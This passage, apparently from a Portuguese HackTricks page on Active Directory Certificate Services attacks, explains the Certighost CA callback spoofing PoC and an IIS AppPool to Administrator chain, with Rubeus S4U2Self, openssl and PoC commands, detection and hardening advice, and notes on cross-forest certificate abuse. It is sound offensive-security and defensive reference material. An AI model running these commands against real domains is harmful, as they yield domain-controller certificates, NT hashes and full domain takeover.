### Explicação

**Certighost** abusa de um caminho de **chase de inscrição / callback do AD CS** no qual a CA confia em atributos de solicitação fornecidos pelo solicitante para resolver a identidade que deve ser incluída no certificado emitido. Na PoC pública, a solicitação criada inclui:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP controlado pelo atacante ao qual a CA se conectará
- **`rmd`**: o **nome DNS do Domain Controller alvo** a ser falsificado

Se a CA seguir esse chase, ela se conectará ao atacante por **SMB/LSA (`445`)** e **LDAP (`389`)**. O atacante usa uma **conta de máquina real** (geralmente criada por meio do **ms-DS-MachineAccountQuota** padrão) para que a sessão de callback se autentique como um principal de domínio válido, mas os serviços rogue retornam os atributos de identidade do **DC alvo**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Se a CA **não vincular criptograficamente a identidade retornada ao principal de callback autenticado**, ela poderá emitir um certificado para o **Domain Controller**, mesmo que a sessão tenha se autenticado como a conta de máquina controlada pelo atacante. Isso torna o bug conceitualmente diferente do **Certifried**: em vez de reescrever atributos do AD, como `dNSHostName`, o atacante **substitui os dados de identidade durante a resolução do callback da CA**.<sup>[[2]](#references)</sup>

**Pré-requisitos úteis:**

- **Credenciais de domínio** com poucos privilégios
- Capacidade de **criar ou reutilizar uma conta de computador**
- Conectividade de rede da **CA** às portas controladas pelo atacante **`389` e `445`**
- Caminho de solicitação da CA vulnerável / sem patch (a atualização da Microsoft de **14 de julho de 2026** adicionou **validação de DC para `cdc`** e uma **comparação de SID resolvido**)

O **`.pfx`** resultante pode então ser usado para **PKINIT**, gerando um **`.ccache`** e, no fluxo da PoC publicada, o **hash NT do DC alvo**, que normalmente é suficiente para o **comprometimento total do domínio**.

### Abuso

A PoC pública automatiza toda a cadeia:<sup>[[1]](#references)</sup>

1. Criar ou reutilizar uma **conta de máquina** controlada pelo atacante.
2. Iniciar listeners rogue de **LDAP e SMB/LSA** nas portas `389` e `445`.
3. Enviar uma solicitação de certificado contendo os atributos **`cdc`** controlado pelo atacante e **`rmd`** do alvo.
4. Permitir que a CA se autentique nos listeners rogue como a conta de máquina controlada, mas responder às consultas de identidade com os atributos do **DC alvo**.
5. Receber um **certificado de DC** assinado pela CA e usá-lo para **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Sinalizadores de runtime úteis do PoC:

- `--listener <ip>`: escolhe explicitamente o IP de callback anunciado em `cdc`
- `--computer-name <NAME$>`: reutiliza uma conta de máquina existente em vez de criar uma nova

**Observações operacionais:**

- O PoC precisa de **root** porque se vincula às **portas privilegiadas** `389` e `445`.
- A exploração bem-sucedida grava localmente um **DC `.pfx`** e um **Kerberos `.ccache`**.
- Como o certificado é mapeado para uma conta de **Domain Controller**, as ações subsequentes podem incluir **autenticação Kerberos baseada em certificado**, **DCSync** e reutilização do **hash NT da máquina** recuperado.<sup>[[2]](#references)</sup>

## Inscrição de máquina do IIS AppPool para Administrator no mesmo host

Um pool do IIS executado como `ApplicationPoolIdentity` usa a **conta de computador** do host para acessar recursos de rede. Portanto, a execução de código como `IIS AppPool\<POOL>` continua com poucos privilégios no token local, mas pode enviar uma solicitação ao AD CS autenticada como `HOST$`; essa é uma transição de identidade de saída, não uma representação de token nem uma elevação local no estilo Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Essa cadeia exige um host IIS associado ao domínio, uma Enterprise CA acessível por RPC, um template de autenticação de máquina publicado para o qual o computador tenha direitos de inscrição, suporte a PKINIT e conectividade com KDC/SMB. Uma identidade personalizada do pool altera o principal de saída; portanto, confirme que o pool realmente usa `ApplicationPoolIdentity` antes de presumir `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Inscrição com chave controlada pelo atacante

Gere o par de chaves e a CSR fora do servidor IIS e mantenha a chave privada. Envie **apenas a CSR** a partir do worker comprometido. O [PoC ASPX Certi-Bhai](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) instancia `CertificateAuthority.Request`, define `CertificateTemplate:Machine`, chama `ICertRequest::Submit` e retorna o certificado emitido. Use a string de configuração da CA `CAHOST\CA-NAME`; um template `Machine` normal cria o subject a partir do AD, portanto, não são necessários dados de subject/SAN fornecidos pelo solicitante.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Combine o certificado retornado com a **chave correspondente mantida**. `certutil -MergePFX machine_cert.cer machine_cert.pfx` só funciona quando o Windows já consegue associar o certificado a uma chave privada acessível; para arquivos PEM separados, crie explicitamente um PKCS#12:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Use o PFX para PKINIT e mantenha o TGT do computador retornado em base64 em vez de injetá-lo imediatamente:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self mais substituição de serviço no mesmo host

S4U2Self permite que um serviço obtenha um ticket **para si mesmo** contendo os dados de autorização de outro usuário. Com o TGT do computador, o Rubeus pode solicitar esse ticket para um usuário privilegiado, reescrever o nome do serviço no KRB-CRED retornado para CIFS e injetá-lo. Essa é a primitiva local “delegate to thyself”: não requer S4U2Proxy nem uma entrada `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

O ticket substituído pode ser usado apenas por serviços na **mesma conta/chave de computador** (aqui, CIFS em `HOST`). Ele não é um ticket de Administrator reutilizável em outras máquinas do domínio. Além disso, o resultado demonstrado é acesso privilegiado a SMB/sistema de arquivos como Administrator; obter um processo local `NT AUTHORITY\SYSTEM` ainda exige uma etapa separada de execução remota.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Detecção e hardening

- Na CA, correlacione os eventos do Certification Services **4886** (solicitação recebida) e **4887** (emitido) para identificar solicitações inesperadas de templates `Machine` feitas por contas de servidores IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- Nos DCs, o evento **4768** inclui campos de certificado quando a pré-autenticação por certificado é usada; gere alertas para solicitações PKINIT incomuns de TGT para contas de servidores web. Em seguida, verifique as solicitações **4769** que envolvam uma identidade privilegiada personificada e o mesmo host. Como o Rubeus `/altservice` reescreve o nome do serviço do KRB-CRED no lado do cliente, não exija que o nome do serviço em 4769 no lado do DC seja `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Procure por `w3wp.exe` acessando endpoints RPC da CA, criação inesperada de arquivos ASPX, acesso a compartilhamentos administrativos autenticado por Kerberos e atividades de extração de secrets. Quando possível, restrinja o acesso da camada de aplicações a RPC da CA/KDC/SMB e remova direitos de inscrição de computadores ou templates de autenticação de máquinas que não sejam operacionalmente necessários.<sup>[[19]](#references)</sup>

## Comprometimento de Florestas com Certificados Explicado na Voz Passiva

### Quebra de Relações de Confiança entre Florestas por CAs Comprometidas

A configuração para **inscrição entre florestas** é relativamente simples. O **certificado da CA raiz** da floresta de recursos é **publicado nas florestas de contas** pelos administradores, e os certificados da **CA empresarial** da floresta de recursos são **adicionados aos contêineres `NTAuthCertificates` e AIA em cada floresta de contas**. Para esclarecer, essa configuração concede à **CA da floresta de recursos controle total** sobre todas as outras florestas para as quais ela gerencia a PKI. Se essa CA for **comprometida por atacantes**, eles poderão **forjar certificados para todos os usuários** tanto na floresta de recursos quanto nas florestas de contas, rompendo assim a fronteira de segurança da floresta.<sup>[[6]](#references)</sup>

### Privilégios de Inscrição Concedidos a Principals Estrangeiros

Em ambientes com várias florestas, é preciso ter cautela com CAs empresariais que **publicam templates de certificado** que permitem **a Authenticated Users ou a principals estrangeiros** (usuários/grupos externos à floresta à qual a CA empresarial pertence) **direitos de inscrição e edição**.\
Após a autenticação por meio de uma relação de confiança, o AD adiciona o **SID de Authenticated Users** ao token do usuário. Assim, se um domínio tiver uma CA empresarial com um template que **conceda direitos de inscrição a Authenticated Users**, um usuário de outra floresta poderá potencialmente **se inscrever no template**. Da mesma forma, se um template **conceder explicitamente direitos de inscrição a um principal estrangeiro**, será criada uma **relação de controle de acesso entre florestas**, permitindo que um principal de uma floresta **se inscreva em um template de outra floresta**.

Ambos os cenários **aumentam a superfície de ataque** de uma floresta para outra. Um atacante pode explorar as configurações do template de certificado para obter privilégios adicionais em um domínio estrangeiro.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 Repositório de PoC](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Análise técnica do Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blog da SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certificado prévio: abusando do Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, interface gráfica do BloodHound, novos métodos de autenticação e solicitação e muito mais](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: abusando do mapeamento de contas por Key Trust para assumir o controle de contas](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – A história do uso (indevido) de Enhanced Key](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Relaying para o AD Certificate Services via RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: acesso ao shell na CA do ADCS com YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Técnica de abuso do ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Técnica de abuso do ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Escalonamento de privilégios (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: não é apenas mais um ESC do AD CS](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: configuração incorreta e exploração](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Revisitando “Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – PoC de inscrição IIS AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Escalonamento de privilégios do IIS AppPool pelo endpoint RPC do AD CS](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Identidades de pools de aplicativos](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Especificações abertas da Microsoft – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – comando pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Auditar Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Evento 4768: um ticket de autenticação Kerberos foi solicitado](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Evento 4769: um ticket de serviço Kerberos foi solicitado](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – kit de ferramentas de exploração do AD CS para PowerShell](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
